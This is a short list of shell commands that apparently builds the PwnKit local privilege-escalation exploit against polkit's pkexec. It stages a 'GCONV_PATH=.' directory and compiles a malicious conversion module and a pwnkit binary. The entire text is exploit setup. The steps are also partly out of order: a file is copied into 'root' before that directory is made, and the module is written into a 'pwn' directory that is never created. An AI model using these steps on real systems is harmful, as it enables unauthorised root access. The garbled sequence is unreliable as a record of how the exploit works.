root
    chmod +x root
    mkdir GCONV_PATH\=.
    cp root GCONV_PATH\=.
    cp gconv-modules root
    mkdir root
    gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c
    gcc -o pwnkit pwnkit.c
